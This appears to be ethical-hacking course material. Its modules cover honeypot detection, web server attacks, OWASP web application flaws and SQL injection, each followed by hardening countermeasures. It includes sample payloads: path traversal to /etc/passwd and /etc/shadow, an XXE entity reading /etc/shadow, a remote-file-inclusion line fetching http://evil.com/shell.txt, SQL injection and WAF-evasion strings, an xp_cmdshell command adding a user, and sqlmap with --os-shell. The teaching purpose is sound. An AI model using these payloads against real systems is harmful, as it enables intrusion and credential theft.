Sophisticated attackers actively try to detect honeypots before launching exploits. Key indicators include:

  • Absence of Legitimate Activity: A corporate server with zero active user sessions, no normal background traffic, or empty log files is a strong indicator of a decoy system.
  • Virtualization Artifacts: Most honeypots run in virtual machines. Attackers look for specific hardware MAC address vendors (OUI indicating VMware or VirtualBox), check the registry for VM specific keys, or look for drivers like vboxguest.sys or vmtoolsd.exe.
  • Anomalous Responses: The system responds unnaturally fast (or slow) to complex queries, or simple emulated services fail to implement obscure parts of a protocol specification correctly.
  • Default Configuration: Finding standard, unmodified honeypot configuration files, default banners, or specific ports known to be used by honeypot management software.

modules.title: Hacking Web Servers
modules.description: Covers web server architectures, common vulnerabilities, attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.
objectives: Understand web server architecture and common platforms (Apache, IIS, Nginx)
Identify web server vulnerabilities and misconfigurations
Perform directory traversal and web server exploitation
Use web server scanning tools for vulnerability assessment
Implement web server hardening countermeasures

topics.title: Web Server Architecture and Misconfigurations
topics.content:
Understanding Web Server Infrastructure

Web servers (like Apache, Microsoft IIS, and Nginx) form the foundation of all web applications. They parse HTTP requests, retrieve or execute the requested resources, and return the HTTP responses. Due to their complex architecture and extensive feature sets, they are highly prone to security misconfigurations, which attackers actively seek out during the reconnaissance phase.

Common Misconfigurations

  • Default Installations: Deploying a web server with default settings is highly dangerous. This often leaves default admin credentials intact, sample applications enabled, debugging scripts accessible, and unnecessary modules loaded. Attackers frequently use automated tools to search for default admin panels (e.g., Tomcat Manager) and known sample scripts that have historical vulnerabilities.
  • Information Disclosure (Banner Grabbing): If a server is configured to send verbose HTTP headers (e.g., Server: Apache/2.4.49 (Unix) OpenSSL/1.1.1), it provides attackers with exact version numbers. This intelligence allows them to target specific known vulnerabilities (CVEs). Furthermore, verbose error messages that reveal stack traces, database connection strings, OS versions, and internal file paths provide a roadmap of the underlying infrastructure.

Header Manipulation Attacks

  • Host Header Injection: If a web server handles virtual hosting but fails to properly validate the HTTP Host header against a whitelist, attackers can manipulate it. This leads to attacks like web cache poisoning, where a malicious response is cached by an intermediary proxy and served to legitimate users, or password reset poisoning, where password reset links sent to users are generated using the attacker's injected domain.
  • HTTP Response Splitting: This attack involves injecting malicious CRLF (Carriage Return Line Feed, represented as %0d%0a or \r\n) characters into user input that is later reflected in HTTP headers. By doing so, the attacker manipulates how the response is processed by intermediaries (like proxies or caches), effectively splitting one HTTP response into two separate responses. This can lead to cache poisoning or Cross-Site Scripting (XSS).

topics.title: Directory Traversal and File Exploitation
topics.content:
Path Traversal Vulnerabilities

Directory traversal (also known as path traversal) is a critical vulnerability that exploits insufficient input validation. It allows an attacker to access files and directories that are stored outside the intended web root directory. By manipulating variables that reference files, attackers use standard directory navigation sequences (like ../ on Linux or ..\ on Windows) to step up the directory tree and access sensitive OS files (e.g., /etc/passwd, /etc/shadow, or C:\boot.ini, C:\Windows\System32\sam).

Filter Evasion Techniques

When basic defense mechanisms (like stripping the exact string ../) are implemented, attackers employ obfuscation techniques to bypass these filters:

  • Double URL Encoding: Instead of sending ../ (which is %2e%2e%2f in standard URL encoding), the attacker encodes the percent sign itself, resulting in %252e%252e%252f. If the application decodes the input twice, the filter is bypassed.
  • Nested Traversal Sequences: An attacker sends ....// or ....\/. If the application's filter simply searches for ../ and deletes it, the remaining characters collapse to form a valid ../ sequence, successfully bypassing the control.
  • Null Byte Injection: Appending a null byte (represented as %00) to a file path can trick older server functions, particularly those written in C/C++ or older versions of PHP. The null byte acts as a string terminator. For example, if the application appends .txt to user input, the payload file=../../../etc/passwd%00 will cause the system to open /etc/passwd, completely ignoring the .txt extension appended by the application.

Case Study: CVE-2021-41773 (Apache Path Traversal)

This was a highly publicized vulnerability in Apache HTTP Server 2.4.49. It was caused by a flaw in how Apache normalized file paths. The server failed to properly handle percent-encoded directory traversal sequences (specifically .%2e/). This allowed attackers to map URLs to files outside the expected document root. If CGI scripts were enabled on the server, this path traversal could be escalated directly to Remote Code Execution (RCE).

topics.title: Web Server Attack Methodology & Scanning
topics.content:
Automated Vulnerability Discovery

Vulnerability scanning and enumeration are crucial steps in the web server attack methodology, designed to map out the attack surface before exploitation.

Key Scanning Tools

  • Nikto: A comprehensive, open-source web server scanner. It performs thousands of tests against web servers for multiple items, including over 6,700 potentially dangerous files/programs, checks for outdated server software versions, and looks for specific version-related problems. It also analyzes server configuration items like the presence of multiple index files and HTTP server options.
  • Directory Brute Forcing (Dirb, Gobuster, Wfuzz): These tools use extensive wordlists to systematically guess and discover hidden directories and files that are not linked anywhere in the HTML source code. This is critical for finding unlinked admin panels (e.g., /admin/login.php), backup archives (e.g., /backup.zip), or hidden configuration files.

Risk Prioritization and Analysis

When reviewing the findings from vulnerability scanners, a penetration tester or security analyst must prioritize risks based on impact. For example, while finding an outdated server version is important, discovering a publicly accessible database backup file (e.g., database_backup.sql) presents the highest immediate risk. Such a file likely contains sensitive user credentials, the entire database schema, and proprietary application data, leading to total compromise.

topics.title: Web Server Hardening
topics.content:
Implementing Defense-in-Depth for Web Servers

Hardening a web server involves stripping away unnecessary functionality, applying strict access controls, and leveraging modern security protocols based on the principle of least privilege.

Configuration and Access Control

  • Minimize the Attack Surface: Remove all default installations, sample files, and documentation. Disable unnecessary services, modules, and administrative ports. The web server process should execute under a dedicated, low-privilege service account (e.g., www-data on Linux), never as root or Administrator.
  • Strict Directory Permissions: Ensure strict file system permissions. The web root should be read-only for the web server process, and write permissions should only be granted to specific upload directories (and execution should be disabled in those upload directories).
  • Error Handling: Configure the server to display generic, uninformative error messages for production environments. Detailed stack traces and errors should be logged internally to secure log files, preventing information disclosure to attackers.
  • Input Validation: Validate and whitelist the Host header to prevent injection attacks. Employ a Web Application Firewall (WAF) to filter malicious traffic and block known attack signatures.

Security Headers

Web servers should be configured to return specific HTTP response headers that instruct the browser to enforce security policies:

  • HTTP Strict-Transport-Security (HSTS): Mandates that the browser must only connect to the server using HTTPS, preventing SSL stripping and protocol downgrade attacks.
  • X-Frame-Options: Set to DENY or SAMEORIGIN to prevent the site from being framed, mitigating Clickjacking attacks.
  • Content-Security-Policy (CSP): A robust header that defines which dynamic resources are allowed to load and execute. It is highly effective at mitigating Cross-Site Scripting (XSS) and data injection attacks.

modules.title: Hacking Web Applications
modules.description: Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, file uploads, and modern web application attack techniques.
objectives: Understand the OWASP Top 10 vulnerability categories
Perform Cross-Site Scripting (XSS), CSRF, and SSRF attacks
Exploit broken authentication, IDOR, and insecure deserialization
Execute file upload and local/remote file inclusion (LFI/RFI) attacks
Implement secure coding practices and WAF protections

topics.title: OWASP Top 10 and Access Control
topics.content:
The OWASP Top 10 Framework

The Open Web Application Security Project (OWASP) Top 10 is a globally recognized awareness document outlining the most critical security risks to web applications. It serves as the de facto industry standard for web application security. Understanding these vulnerabilities is paramount for both attacking and defending modern web applications.

Broken Access Control

Currently ranked as the number one risk in the OWASP Top 10, Broken Access Control occurs when an application fails to properly enforce policies regarding what users are allowed to do. When access control is broken, users can act outside their intended permissions, leading to unauthorized information disclosure, modification, or destruction of data.

Insecure Direct Object References (IDOR)

A primary and highly prevalent example of broken access control is Insecure Direct Object References (IDOR). IDOR occurs when an application provides direct access to objects (like database records, files, or transactions) based on user-supplied input without proper authorization checks to verify if the requesting user actually owns or has permission to access that specific object.

For instance, consider a user navigating to their profile using the URL /api/user/1234/profile. If an attacker changes the URL parameter to /api/user/1235/profile and successfully views or modifies another user's private data, they have successfully exploited an IDOR vulnerability.

Privilege Escalation

Another critical access control failure is Privilege Escalation.

  • Vertical Privilege Escalation: A standard user manipulates parameters (e.g., changing role=user to role=admin in a hidden form field or API request) to gain administrative rights.
  • Horizontal Privilege Escalation: A user accesses data belonging to another user with the same level of privileges (which is essentially what IDOR achieves).

topics.title: Cross-Site Scripting (XSS)
topics.content:
Understanding XSS

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or output escaping. This allows attackers to execute malicious scripts (typically JavaScript) in the victim's browser. The victim's browser executes the script because it believes the script came from a trusted source (the vulnerable web application). XSS can be used to steal session cookies, deface websites, or redirect users to malicious domains.

Types of XSS

  • Stored (Persistent) XSS: This is the most dangerous form. The malicious script is injected and saved permanently on the target server (e.g., in a database via a forum post, a comment field, or a profile description). It executes automatically every time any user views the affected page. No social engineering is required for the payload to trigger.
  • Reflected (Non-Persistent) XSS: The injected script is reflected off the web server, such as in an error message, a search result, or any response that includes some or all of the input sent to the server as part of the request. It requires social engineering, forcing the victim to click a specially crafted URL containing the payload (e.g., http://site.com/search?q=<script>alert(1)</script>). The script is not stored on the server.
  • DOM-based XSS: Unlike Stored and Reflected XSS, DOM-based XSS vulnerabilities exist entirely in the client-side code rather than the server-side code. The malicious payload is executed as a result of modifying the Document Object Model (DOM) environment in the victim's browser. It often involves client-side sources like window.location and execution sinks like innerHTML or document.write.

XSS Defenses

Defenses include strict contextual output encoding (ensuring data is treated as content, not executable code), rigorous input validation, and implementing a strong Content Security Policy (CSP) to restrict where scripts can be loaded from and prevent inline script execution.

topics.title: CSRF, SSRF, and XXE
topics.content:
Cross-Site Request Forgery (CSRF)

CSRF tricks the victim's browser into making unintended, authenticated requests to a vulnerable application where the user is currently logged in. Because the browser automatically includes the victim's session cookies with the request, the vulnerable application processes the request as legitimate.

For example, an attacker hosts a hidden HTML form pointing to a banking transfer URL (http://bank.com/transfer?amount=1000&toAcct=Attacker) and uses JavaScript to auto-submit it when the victim visits the attacker's site. Defense requires implementing unpredictable Anti-CSRF tokens. Crucially, the server must actively validate that the submitted token matches a value stored on the server for that specific session; simply checking if a token is present is insufficient.

Server-Side Request Forgery (SSRF)

In an SSRF attack, the attacker coerces the vulnerable server into making HTTP requests to unintended internal or external resources on the attacker's behalf. This bypasses firewalls because the request originates from a trusted internal server.

A common and highly critical SSRF target in cloud environments (AWS, Azure, GCP) is the cloud instance metadata endpoint (e.g., typically found at the non-routable IP http://169.254.169.254/latest/meta-data/). By forcing the server to fetch this URL, attackers can retrieve highly sensitive IAM (Identity and Access Management) credentials, temporary API keys, and infrastructure details, leading to complete cloud environment compromise.

XML External Entity (XXE) Injection

XXE targets poorly configured XML parsers. An attacker submits an XML payload containing a malicious <!DOCTYPE> declaration that defines an external entity pointing to a local file or internal network resource.

<!ENTITY xxe SYSTEM "file:///etc/shadow">

When the XML parser processes the document, the entity (&xxe;) is replaced with the local file's contents, leading to massive data disclosure. Defense involves completely disabling external entity parsing and Document Type Definition (DTD) processing within the XML parser configuration.

topics.title: Authentication, File Uploads, and LFI/RFI
topics.content:
Modern Authentication Vulnerabilities

Modern applications heavily rely on JSON Web Tokens (JWT) for stateless authentication. A critical vulnerability here is JWT Algorithm Confusion. An attacker modifies the JWT header to specify {"alg":"none"} and deliberately removes the digital signature. If the server's JWT library is misconfigured to accept the 'none' algorithm, it processes the token as valid without verifying a signature, allowing the attacker to forge arbitrary tokens with elevated administrative claims.

Insecure File Uploads

If a server attempts to restrict file uploads solely by validating file extensions (e.g., only allowing .jpg) via client-side JavaScript or simple string matching, it is easily bypassed. Attackers use several techniques to upload web shells (malicious scripts granting Remote Code Execution):

  • Double Extensions: Uploading a file named shell.php.jpg. If the server only checks the final extension, it passes, but the web server might execute the .php part.
  • MIME Type Spoofing: Changing the MIME type in the HTTP Content-Type header via Burp Suite from application/x-php to image/jpeg to bypass back-end type checks.
  • Null Byte Injection: Submitting shell.php%00.jpg. The server validates the .jpg, but the OS saves it as shell.php.

Local and Remote File Inclusion (LFI/RFI)

File Inclusion vulnerabilities occur when an application dynamically includes files based on user input without sanitization.

  • Local File Inclusion (LFI): Allows an attacker to include files already existing on the local server. For example, ?page=../../etc/passwd reads local system files. In PHP applications, LFI can be weaponized using PHP Wrappers. For instance, php://filter/convert.base64-encode/resource=index.php allows an attacker to read the application's source code (like database passwords in config files) by base64 encoding it before it gets executed by the PHP engine.
  • Remote File Inclusion (RFI): Allows an attacker to specify a URL to a remote file hosted on an attacker-controlled server. For example, ?page=http://evil.com/shell.txt. The vulnerable application fetches the remote script and executes it locally, granting immediate remote code execution.

modules.title: SQL Injection
modules.description: In-depth coverage of SQL injection attack types (in-band, blind, out-of-band), exploitation techniques with SQLMap, and comprehensive prevention through parameterized queries, stored procedures, and input validation.
objectives: Understand SQL injection concepts, mechanics, and attack types
Perform in-band (Error/UNION), blind (Boolean/Time), and out-of-band SQL injection
Use SQLMap for automated SQL injection discovery and exploitation
Extract data, escalate privileges, and execute OS commands via SQLi
Implement robust SQL injection countermeasures

topics.title: SQL Injection Fundamentals
topics.content:
The Mechanics of SQL Injection

SQL Injection (SQLi) is one of the oldest and most devastating web application vulnerabilities. It occurs when untrusted user input is concatenated directly into database queries without proper parameterization or escaping. Because the database engine cannot distinguish between the developer's intended query structure and the attacker's injected input, it treats the attacker's input as executable SQL code. This allows attackers to alter the query logic to view unauthorized data, modify records, delete databases, or even gain operating system access.

Authentication Bypass via Tautology

A classic and fundamental example of SQLi is Authentication Bypass using a tautology (a statement that is always true). Consider a login query structured like this:

SELECT * FROM users WHERE username = '$user' AND password = '$password'

If an attacker enters ' OR '1'='1' -- into the username field, the resulting query executed by the database becomes:

SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '...'

Here's how it breaks down:

  • The initial single quote (') breaks out of the string literal intended for the username variable.
  • The OR '1'='1' injects a universally true condition into the WHERE clause.
  • The double dash (--) is the SQL comment indicator. It tells the database engine to ignore the remainder of the query, effectively disabling the password check entirely.

Because the condition evaluates to true for every row in the users table, the database returns the first user record it finds (which is very often the administrative account created during setup), granting the attacker unauthorized access without needing a valid password.

topics.title: In-Band SQL Injection
topics.content:
In-Band (Classic) Extraction

In-band SQL injection occurs when the attacker uses the same communication channel (the web application's HTTP responses) to both launch the attack and directly retrieve the extracted database results. It is generally the easiest form of SQLi to exploit.

Error-Based SQLi

In this technique, the attacker extracts data by intentionally injecting syntax errors, type mismatches, or mathematical impossibilities (like attempting to divide by zero or converting a string containing a database version into an integer) to deliberately trigger database errors. If the web application has verbose error logging enabled and reflects database errors back to the browser, the error message itself will leak valuable information, such as table names, column names, or actual extracted data.

UNION-Based SQLi

This technique leverages the UNION SELECT SQL operator to combine the results from the attacker's injected malicious query with the results of the original legitimate query into a single result set that the application displays.

However, before a UNION-based attack can succeed, two strict database rules must be satisfied:

  1. Column Matching: The injected query must request the exact same number of columns as the original query. Attackers determine this by incrementing an ORDER BY clause (e.g., ORDER BY 1, ORDER BY 2... until an error occurs, indicating the column count) or by injecting multiple NULL values (UNION SELECT NULL, NULL, NULL...).
  2. Data Type Matching: The data types of the columns in the injected query must be compatible with the corresponding columns in the original query (e.g., you cannot put a string into an integer column).

Once the structure is known, attackers can extract full tables (e.g., UNION SELECT username, password FROM administrators).

topics.title: Blind SQL Injection
topics.content:
Extracting Data without Direct Output

Blind SQL Injection is necessary when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. The attacker is "blind" to the direct output and must extract data slowly, inferring the data bit by bit based on the application's behavior.

Boolean-Based (Inferential) Blind SQLi

The attacker infers information by asking the database a series of true/false questions and observing if the web application returns a slightly different page, or perhaps an empty page, based on the answer.

For example, if an attacker wants to know if the first letter of the database name is 'A', they inject a condition:

/products?id=1 AND (SELECT SUBSTRING(db_name(), 1, 1)) = 'A'

If the application returns the normal product page (the condition was TRUE), the attacker knows the letter is 'A'. If the page returns empty or a generic error (the condition was FALSE), the attacker tries 'B', and so on. This process is tedious but highly effective.

Time-Based Blind SQLi

This technique is used when the application response is absolutely identical regardless of whether the injected condition is true or false. The attacker infers true/false conditions by injecting time delay functions into the query.

For example, using Microsoft SQL Server's WAITFOR DELAY '0:0:5', PostgreSQL's pg_sleep(5), or MySQL's SLEEP(5).

The query might look like: IF (SUBSTRING(USER(), 1, 1) = 'A') WAITFOR DELAY '0:0:5'.

If the web server takes exactly 5 seconds longer to respond than usual, the attacker confirms the condition is TRUE. If it responds immediately, the condition is FALSE.

topics.title: Advanced SQL Injection, OOB, and Automation
topics.content:
Advanced Exploitation Techniques

  • Out-of-Band (OOB) SQLi: Used when direct responses are absent and time delays are impractical or too slow. The attacker crafts a payload that forces the database server itself to initiate an external network connection (e.g., a DNS resolution or an HTTP/SMB request) to a server controlled by the attacker. The stolen data is embedded within that request. In Microsoft SQL Server, the xp_dirtree extended stored procedure is commonly used to trigger SMB or DNS requests containing exfiltrated data.
  • Second-Order (Stored) SQLi: A highly stealthy attack. The malicious payload is submitted in a context where it is deemed safe and stored in the database (e.g., in a profile name during account creation, bypassing initial input validation). The payload remains dormant until a different application function later retrieves that stored data and executes it within a new, unparameterized SQL query (e.g., generating an invoice).
  • OS Command Execution: Under certain configurations, SQL injection can escalate to full operating system-level access. In Microsoft SQL Server, if the xp_cmdshell extended stored procedure is enabled, an attacker can execute OS commands directly. For example: '; EXEC xp_cmdshell 'net user hacker P@ss123 /add' -- creates a new Windows user account. In MySQL, attackers might use the INTO OUTFILE directive to write a PHP web shell directly into the web server's document root.

WAF Evasion and Automation

When standard SQL keywords (like SELECT or UNION) are blocked by a Web Application Firewall (WAF), attackers employ evasion techniques. These include case variation (uNiOn SeLeCt), using inline comments to split words apart without breaking SQL syntax (SEL/**/ECT or MySQL-specific /*!SELECT*/), URL encoding, Hex encoding, Unicode encoding, or replacing standard spaces with tabs or newlines.

SQLMap is the industry-standard tool for automating SQLi discovery and exploitation. It fully automates the tedious process of blind SQLi extraction and database enumeration. For example, sqlmap -u 'http://target.com/page?id=1' --dbs --batch tests the parameter and enumerates all databases automatically. Flags like --os-shell attempt to automatically upload a stager to gain an interactive command prompt on the underlying OS.

topics.title: SQL Injection Countermeasures
topics.content:
Eradicating SQL Injection

Preventing SQL injection is primarily the responsibility of the application developer. Network defenses (like WAFs) provide defense-in-depth but do not fix the underlying code vulnerability.

Parameterized Queries (Prepared Statements)

This is the absolute most effective and primary defense against all forms of SQL injection. Parameterization forces the developer to first define all the SQL code, and then pass in each parameter (user input) to the query later. The database engine pre-compiles the SQL structure, and treats the user input strictly as literal values (strings or integers), never interpreting them as executable SQL commands, regardless of any special characters (like quotes or semicolons) they contain.

Stored Procedures and Input Validation

  • Stored Procedures: When properly parameterized internally, stored procedures provide a similar level of protection to prepared statements. They also encapsulate database queries on the database side rather than the application side, adding a layer of architectural security.
  • Input Validation and Allow-listing: All user input should be strictly validated against an allow-list (e.g., verifying an age field only contains numbers, or an email field matches a specific regex format). Relying solely on block-lists or character escaping (like doubling single quotes) is considered a weaker, secondary defense because it is prone to evasion bypasses (like encoding or null bytes).

Principle of Least Privilege

Ensure the database service account used by the web application has the absolute minimum permissions required to function. The application should never connect using administrative accounts like sa (SQL Server) or root (MySQL). Revoke access to dangerous extended stored procedures (like xp_cmdshell) and restrict file system read/write access (to prevent INTO OUTFILE attacks) to limit the impact if an injection vulnerability is found.
